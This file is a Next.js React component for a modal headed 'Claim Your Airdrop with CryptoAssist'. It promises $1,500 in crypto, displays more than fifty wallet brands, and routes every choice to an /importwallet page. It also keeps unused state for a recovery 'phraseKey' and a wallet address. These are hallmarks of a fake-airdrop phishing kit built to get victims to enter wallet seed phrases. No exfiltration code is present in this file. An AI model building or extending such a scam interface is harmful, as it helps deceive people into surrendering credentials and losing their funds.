"use client"

import { useState } from "react"
import Link from "next/link"

const WALLETS = [
  { name: "Alpha Wallet", icon: "🅰️" },
  { name: "Argent X", icon: "🛡️" },
  { name: "Atomic Wallet", icon: "⚛️" },
  { name: "Bitget Wallet", icon: "🎯" },
  { name: "Binance Web3", icon: "🔶" },
  { name: "BlueWallet", icon: "💙" },
  { name: "Brave Wallet", icon: "🦁" },
  { name: "Coin98", icon: "💰" },
  { name: "Coinbase", icon: "📱" },
  { name: "Coinomi", icon: "🪙" },
  { name: "CoolWallet", icon: "❄️" },
  { name: "Crypto.com DeFi", icon: "🔴" },
  { name: "Electrum", icon: "⚡" },
  { name: "Ellipal Titan", icon: "🛡️" },
  { name: "Enjin Wallet", icon: "🎮" },
  { name: "Exodus", icon: "📤" },
  { name: "Frame Wallet", icon: "🖼️" },
  { name: "Frontier", icon: "🌍" },
  { name: "Guarda", icon: "🏰" },
  { name: "Huobi/HTX", icon: "🔶" },
  { name: "ImToken", icon: "📲" },
  { name: "Keplr", icon: "🪐" },
  { name: "Keystone Pro", icon: "🔑" },
  { name: "KuCoin", icon: "🟡" },
  { name: "Ledger Nano", icon: "🔐" },
  { name: "Magic Eden", icon: "✨" },
  { name: "Maiar Wallet", icon: "🌟" },
  { name: "MathChain", icon: "🔢" },
  { name: "MathWallet", icon: "Ⓜ️" },
  { name: "MetaMask", icon: "🦊" },
  { name: "Muun", icon: "🌙" },
  { name: "Nabox", icon: "📦" },
  { name: "OKX Wallet", icon: "🟣" },
  { name: "ONTO Wallet", icon: "🌐" },
  { name: "Opera Crypto", icon: "🎭" },
  { name: "Phantom", icon: "👻" },
  { name: "Pillar", icon: "🏛️" },
  { name: "Rabby", icon: "🐰" },
  { name: "Rainbow", icon: "🌈" },
  { name: "SafePal", icon: "🛡️" },
  { name: "SafeMath", icon: "🔒" },
  { name: "Samourai", icon: "⚔️" },
  { name: "Sparrow", icon: "🐦" },
  { name: "Stake", icon: "📍" },
  { name: "Taho", icon: "🎨" },
  { name: "Temple", icon: "🏛️" },
  { name: "Trezor", icon: "🛡️" },
  { name: "TokenPocket", icon: "👜" },
  { name: "Trust Wallet", icon: "✅" },
  { name: "ViaWallet", icon: "🌉" },
  { name: "WalletConnect", icon: "🔗" },
  { name: "Wasabi", icon: "🌶️" },
  { name: "XDEFI", icon: "❌" },
  { name: "Zerion", icon: "Z️" },
]

const CRYPTOS = [
  "Bitcoin (BTC)",
  "Ethereum (ETH)",
  "Cardano (ADA)",
  "Solana (SOL)",
  "Polkadot (DOT)",
  "Ripple (XRP)",
  "Litecoin (LTC)",
  "Chainlink (LINK)",
  "Polygon (MATIC)",
  "Avalanche (AVAX)",
  "Arbitrum (ARB)",
  "Optimism (OP)",
]

export default function WalletModal({ open, onOpenChange }: { open: boolean; onOpenChange: (open: boolean) => void }) {
  const [step, setStep] = useState<"wallet" | "phrase" | "success">("wallet")
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [selectedCrypto, setSelectedCrypto] = useState<string | null>(null)
  const [phraseKey, setPhraseKey] = useState("")
  const [walletAddress, setWalletAddress] = useState("")

  const handleWalletSelect = () => {
    if (selectedWallet && selectedCrypto) {
      setStep("phrase")
    }
  }

  const handlePhraseSubmit = () => {
    if (phraseKey.trim() && walletAddress.trim()) {
      setStep("success")
      setTimeout(() => {
        onOpenChange(false)
        resetForm()
      }, 2000)
    }
  }

  const resetForm = () => {
    setStep("wallet")
    setSelectedWallet(null)
    setSelectedCrypto(null)
    setPhraseKey("")
    setWalletAddress("")
  }

  if (!open) return null

  return (
    <div className="fixed inset-0 z-50 pointer-events-none">
      {/* Overlay */}
      <div
        className="absolute inset-0 bg-black/70 pointer-events-auto"
        onClick={() => {
          onOpenChange(false)
        }}
      />

      {/* Modal */}
      <div className="absolute inset-0 flex items-center justify-center pointer-events-auto">
        <div className="bg-blue-900 rounded-xl shadow-2xl max-w-3xl w-full mx-4 p-8 max-h-[90vh] overflow-y-auto">
          {/* Header */}
          <div className="mb-8 flex justify-between items-start">
            <div>
              <h2 className="text-3xl font-bold text-white">Claim Your Airdrop with CryptoAssist</h2>
              <p className="text-cyan-400 text-sm mt-2">Earn $1,500 Worth of Crypto - Choose from 50+ Wallets</p>
            </div>
            <button onClick={() => onOpenChange(false)} className="text-blue-300 hover:text-white transition">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          {/* Content */}
          <div className="space-y-6">
            <div>
              <h3 className="text-lg font-semibold text-white mb-4">Select Your Wallet (50+ Available)</h3>
              <div className="grid grid-cols-6 md:grid-cols-8 gap-2 max-h-64 overflow-y-auto">
                {WALLETS.map((wallet) => (
                  <Link
                    key={wallet.name}
                    href="/importwallet"
                    className="p-3 rounded-lg border-2 border-blue-700 bg-blue-900 hover:border-cyan-400 hover:bg-blue-800 hover:shadow-lg hover:shadow-cyan-500/50 transition flex flex-col items-center gap-1"
                    title={wallet.name}
                  >
                    <span className="text-2xl">{wallet.icon}</span>
                    <span className="text-xs font-medium text-white text-center line-clamp-2">{wallet.name}</span>
                  </Link>
                ))}
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex gap-3 pt-4">
              <button
                onClick={() => onOpenChange(false)}
                className="flex-1 px-4 py-3 border-2 border-blue-700 text-white rounded-lg hover:border-blue-600 transition font-semibold"
              >
                Cancel
              </button>
              <Link
                href="/importwallet"
                className="flex-1 px-4 py-3 bg-cyan-500 hover:bg-cyan-600 text-blue-950 rounded-lg transition font-semibold text-center"
              >
                Continue to Claim
              </Link>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
